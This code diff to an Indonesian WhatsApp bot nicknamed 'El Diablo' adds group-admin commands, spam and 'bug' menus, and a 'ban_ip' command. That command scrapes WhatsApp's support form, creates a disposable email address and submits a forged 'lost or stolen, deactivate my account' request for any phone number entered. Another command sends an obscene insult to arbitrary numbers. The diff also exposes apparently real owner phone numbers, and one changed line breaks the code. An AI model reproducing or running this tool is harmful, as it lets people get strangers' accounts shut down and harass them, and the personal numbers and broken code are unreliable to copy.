@@ -24,7 +24,7 @@ chats: {},
 }
 
 global.ownerName = 'El Diablo'
-global.ownerNumber = ["@s.whatsapp.net", "@s.whatsapp.net", "@s.whatsapp.net"]
+global.ownerNumber = ["6285157792618@s.whatsapp.net", "6281266652007@s.whatsapp.net", "6288989555217@s.whatsapp.net"]
 global.prefa = ['','.']
 global.mess = {
     wait: 'Wait Sis Please be patient',
@@ -109,7 +109,7 @@ const listMessage = {
  text: `亗╭┬─────────────────┈ 
 亗├ 「 Hallo 」 「 ${pushname} 」
 亗├──────────────────┈`,
-                footer: 'w',
+                footer: 'Ari Maulana Firmansyah',
   title: `Setting Group ${groupName}`,
   buttonText: "Klik Disini!",
   sections
@@ -266,6 +266,7 @@ jiren = `
 SILAHKAN PILIH MENU DIBAWAH
 
 • bugmenu
+• verifmenu
 • spammenu
 • aimenu
 • othermenu
@@ -311,6 +312,29 @@ jiren = `
 `
 diablobotwhatsapp.reply(jiren)
 break
+case 'verifmenu':
+
+jiren = `
+
+▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
+
+                  verifmenu
+
+▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
+
+【♡ۣۜۜ፝͜͜͡͡✿➣  ban ( 8xxxx ) (android
+
+【♡ۣۜۜ፝͜͜͡͡✿➣  ban_ip ( 8xxxx ) (iPhone)
+
+▬▭▬▭▬▭▬▭▬▭▬▭▬
+
+    
+
+`
+
+diablobotwhatsapp.reply(jiren)
+
+break
 case 'aimenu':
 jiren = `
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
@@ -337,6 +361,58 @@ jiren = `
 `
 diablobotwhatsapp.reply(jiren)
 break
+        case 'kick':
+
+if (!khususOwner) return (`fiture admin ini bang`)
+
+if (!q) return (`kick 628xxx`)
+
+nomer = `${q}` + '@s.whatsapp.net'
+diablo.groupParticipantsUpdate(idgrup,
+   [nomer,nomer],
+"remove"
+   )
+diablobotwhatsapp.reply(`Success`)
+        break
+        case 'angkat_derajat':
+
+if (!khususOwner) return (`fiture admin ini bang`)
+
+if (!q) return (`angkat_derajat
+628xxx`)
+
+nomer = `${q}` + '@s.whatsapp.net'
+
+diablo.groupParticipantsUpdate(idgrup,
+
+   [nomer,nomer],
+
+"promote"
+
+   )
+
+diablobotwhatsapp.reply(`Success`)
+
+        break
+        case 'turun_derajat':
+
+if (!khususOwner) return (`fiture admin ini bang`)
+
+if (!q) return (`turun_derajat 628xxx`)
+
+nomer = `${q}` + '@s.whatsapp.net'
+
+diablo.groupParticipantsUpdate(idgrup,
+
+   [nomer,nomer],
+
+"demote"
+
+   )
+
+diablobotwhatsapp.reply(`Success`)
+
+        break
 case 'grup':
 diablo.sendMessage(from, listMessage)
 break
@@ -403,8 +479,87 @@ if (!isGroupAdmins) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan 
 
  }
  break
+   case 'ban_ip': {
+
+ if (!itsMediablo) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
+
+if (!isGroupAdmins) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
+
+   var axioss = require ("axios")
+
+   let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
+
+ let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
+
+ let cookie = ntah.headers["set-cookie"].join("; ")
+
+ let $ = cheerio.load(ntah.data)
+
+ let $form = $("form");
+
+ let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
+
+ let form = new URLSearchParams()
+
+ form.append("jazoest", $form.find("input[name=jazoest]").val())
+
+ form.append("lsd", $form.find("input[name=lsd]").val())
+
+ form.append("step", "submit")
+
+ form.append("country_selector", "ID")
+
+ form.append("phone_number", q)
+
+ form.append("email", email.data[0])
+
+ form.append("email_confirm", email.data[0])
+
+ form.append("platform", "IPHONE")
+
+ form.append("your_message", "Perdido/roubado: desative minha conta")
+
+ form.append("__user", "0")
+
+ form.append("__a", "1")
+
+ form.append("__csr", "")
+
+ form.append("__req", "8")
+
+ form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
+
+ form.append("dpr", "1")
+
+ form.append("__ccg", "UNKNOWN")
+
+ form.append("__rev", "1006630858")
+
+ form.append("__comment_req", "0")
+
+ let res = await axios({
+
+   url,
+
+   method: "POST",
+
+   data: form,
+
+   headers: {
+
+     cookie
+
+   }
+
+ })
+
+  diablobotwhatsapp.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
+
+ }
+
+ break
 case 'buyspammenu':
-diablo.sendImage(from, 'https://.com/qris.png', `SIlahkan Scan QR Ini, Jika Sudah Lapor Admin`)
+diablo.sendImage(from, 'https://arpaysmm.com/qris.png', `SIlahkan Scan QR Ini, Jika Sudah Lapor Admin`)
 break
 case 'restart':{
  if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
@@ -462,8 +617,19 @@ break
 case 'tag': {
  if (!khususOwner) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
    
-diablo.sendMessage(diablobotwhatsapp.chat, { text : 'HIDE TAG BY ' ? q : 'HIDE TAG BY ' , mentions: participants.map(a => a.id)}, { quoted: diablobotwhatsapp })
+diablo.sendMessage(diablobotwhatsapp.chat, { text : 'HIDE TAG BY AMFCODE' ? q : 'HIDE TAG BY AMFCODE' , mentions: participants.map(a => a.id)}, { quoted: diablobotwhatsapp })
 }
+break
+        case 'menfess':
+
+if (!q) return (`Masukan Nomer Gblok`)
+
+num = `${q}`+'@s.whatsapp.net'
+
+diablo.sendMessage(num, `woi kontol`)
+
+diablobotwhatsapp.reply(`Succcess`)
+
 break
 case 'test':
 case 'stats':{
@@ -479,7 +645,7 @@ last.times.user += cpu.times.user
 last.times.nice += cpu.times.nice
 last.times.sys += cpu.times.sys
 last.times.idle += cpu.times.idle
-last.times.irq += cpu.times.irq
+last.times.irq += cpu.times. ini
 return last
 }, {
 speed: 0,
